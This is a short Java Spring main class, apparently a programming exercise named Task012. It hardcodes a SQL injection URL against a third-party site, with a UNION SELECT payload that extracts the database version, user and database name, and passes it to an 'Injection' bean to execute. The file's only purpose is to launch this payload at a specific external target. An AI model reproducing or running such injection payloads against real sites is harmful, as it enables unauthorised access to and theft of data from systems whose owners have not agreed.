package Task012;

import org.springframework.context.ApplicationContext;
import org.springframework.context.annotation.AnnotationConfigApplicationContext;

/**
 * Created by User on 24.03.16.
 */
public class Main {

    public static void main(String[] args) {
        String lang = "http://mebellook.ru/cat.php?id=1 union select 1,version(),3,user(),database(),6,7,8";
        ApplicationContext context = new AnnotationConfigApplicationContext(Config.class);
        Injection injection = (Injection) context.getBean("Inj");
        injection.execute(lang);
    }
}
